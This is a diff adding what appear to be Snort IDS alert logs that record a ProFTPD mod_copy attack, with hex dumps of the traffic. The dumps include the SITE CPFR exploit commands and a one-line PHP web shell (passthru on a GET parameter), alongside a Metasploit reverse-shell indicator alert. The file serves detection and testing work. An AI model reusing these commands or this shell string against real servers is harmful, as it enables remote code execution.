@@ -1,0 +1,58 @@
+06/15-17:59:00.998702 [**] [1:34225:5] "PROTOCOL-FTP ProFTPD mod_copy remote code execution attempt" [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.1.3:36273 -> 192.168.2.2:21
+
+ftp_server.stream_tcp[30]:
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+53 49 54 45 20 43 50 46  52 20 2F 70 72 6F 63 2F  SITE CPF R /proc/
+73 65 6C 66 2F 63 6D 64  6C 69 6E 65 0D 0A        self/cmd line..
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+
+06/15-17:59:00.998702 [**] [1:34447:7] "POLICY-OTHER ProFTPD mod_copy unauthenticated file copy attempt" [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 192.168.1.3:36273 -> 192.168.2.2:21
+
+ftp_server.stream_tcp[30]:
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+53 49 54 45 20 43 50 46  52 20 2F 70 72 6F 63 2F  SITE CPF R /proc/
+73 65 6C 66 2F 63 6D 64  6C 69 6E 65 0D 0A        self/cmd line..
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+
+06/15-17:59:01.009797 [**] [1:34447:7] "POLICY-OTHER ProFTPD mod_copy unauthenticated file copy attempt" [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 192.168.1.3:36273 -> 192.168.2.2:21
+
+ftp_server.stream_tcp[51]:
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+53 49 54 45 20 43 50 46  52 20 2F 74 6D 70 2F 2E  SITE CPF R /tmp/.
+3C 3F 70 68 70 20 70 61  73 73 74 68 72 75 28 24  <?php pa ssthru($
+5F 47 45 54 5B 27 68 43  57 56 51 27 5D 29 3B 3F  _GET['hC WVQ']);?
+3E 0D 0A                                          >..
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+
+06/15-17:59:01.043342 [**] [1:34224:3] "INDICATOR-SHELLCODE Metasploit payload cmd_unix_reverse_perl" [**] [Classification: Executable code was detected] [Priority: 1] {TCP} 192.168.1.3:36431 -> 192.168.2.2:80
+
+http_inspect.stream_tcp[157]:
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+48 6F 73 74 3A 20 31 39  32 2E 31 36 38 2E 32 2E  Host: 19 2.168.2.
+32 0D 0A 55 73 65 72 2D  41 67 65 6E 74 3A 20 4D  2..User- Agent: M
+6F 7A 69 6C 6C 61 2F 35  2E 30 20 28 69 50 61 64  ozilla/5 .0 (iPad
+3B 20 43 50 55 20 4F 53  20 31 35 5F 31 20 6C 69  ; CPU OS  15_1 li
+6B 65 20 4D 61 63 20 4F  53 20 58 29 20 41 70 70  ke Mac O S X) App
+6C 65 57 65 62 4B 69 74  2F 36 30 35 2E 31 2E 31  leWebKit /605.1.1
+35 20 28 4B 48 54 4D 4C  2C 20 6C 69 6B 65 20 47  5 (KHTML , like G
+65 63 6B 6F 29 20 56 65  72 73 69 6F 6E 2F 31 35  ecko) Ve rsion/15
+2E 30 20 4D 6F 62 69 6C  65 2F 31 35 45 31 34 38  .0 Mobil e/15E148
+20 53 61 66 61 72 69 2F  36 30 34 2E 31            Safari/ 604.1
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+
+06/15-17:59:01.043342 [**] [1:50447:1] "POLICY-OTHER HTTP request by IPv4 address attempt" [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 192.168.1.3:36431 -> 192.168.2.2:80
+
+http_inspect.stream_tcp[157]:
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+48 6F 73 74 3A 20 31 39  32 2E 31 36 38 2E 32 2E  Host: 19 2.168.2.
+32 0D 0A 55 73 65 72 2D  41 67 65 6E 74 3A 20 4D  2..User- Agent: M
+6F 7A 69 6C 6C 61 2F 35  2E 30 20 28 69 50 61 64  ozilla/5 .0 (iPad
+3B 20 43 50 55 20 4F 53  20 31 35 5F 31 20 6C 69  ; CPU OS  15_1 li
+6B 65 20 4D 61 63 20 4F  53 20 58 29 20 41 70 70  ke Mac O S X) App
+6C 65 57 65 62 4B 69 74  2F 36 30 35 2E 31 2E 31  leWebKit /605.1.1
+35 20 28 4B 48 54 4D 4C  2C 20 6C 69 6B 65 20 47  5 (KHTML , like G
+65 63 6B 6F 29 20 56 65  72 73 69 6F 6E 2F 31 35  ecko) Ve rsion/15
+2E 30 20 4D 6F 62 69 6C  65 2F 31 35 45 31 34 38  .0 Mobil e/15E148
+20 53 61 66 61 72 69 2F  36 30 34 2E 31            Safari/ 604.1
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+
